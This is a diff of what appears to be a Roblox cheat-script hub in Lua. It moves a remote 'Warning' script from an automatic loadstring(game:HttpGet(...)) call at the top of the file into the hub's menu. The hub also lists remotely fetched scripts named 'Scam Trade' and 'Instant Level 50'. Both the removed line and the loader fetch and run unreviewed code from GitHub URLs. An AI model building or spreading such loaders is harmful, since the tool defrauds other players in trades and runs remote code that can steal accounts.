@@ -1,5 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Script-Working/loadscreen/refs/heads/main/Warning"))()
-
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local HttpService = game:GetService("HttpService")
@@ -89,7 +87,7 @@ local scriptUrls = {
     "https://raw.githubusercontent.com/ThundarZ/Welcome/refs/heads/main/Main/GaG/Main.lua",
     "https://raw.githubusercontent.com/Script-Working/loadscreen/refs/heads/main/lvl2.",
     "https://raw.githubusercontent.com/Script-Working/loadscreen/refs/heads/main/Trade%20Scam%20With%20cooldown", -- Replace with your fifth script
-    "https://raw.githubusercontent.com/your-repo/script6/main.lua", -- Replace with your sixth script
+    "https://raw.githubusercontent.com/Script-Working/loadscreen/refs/heads/main/Warning", -- Replace with your sixth script
     "https://raw.githubusercontent.com/your-repo/script7/main.lua", -- Replace with your seventh script
     "https://raw.githubusercontent.com/your-repo/script8/main.lua"  -- Replace with your eighth script
 }
@@ -100,7 +98,7 @@ local scriptNames = {
     "Auto Middle Cat",
     "Instant Level 50",
     "Scam Trade", -- Replace with your fifth script name
-    "SOON", -- Replace with your sixth script name
+    "IMPORTANT READ THIS!!!!!", -- Replace with your sixth script name
     "SOON", -- Replace with your seventh script name
     "SOON"  -- Replace with your eighth script name
 }
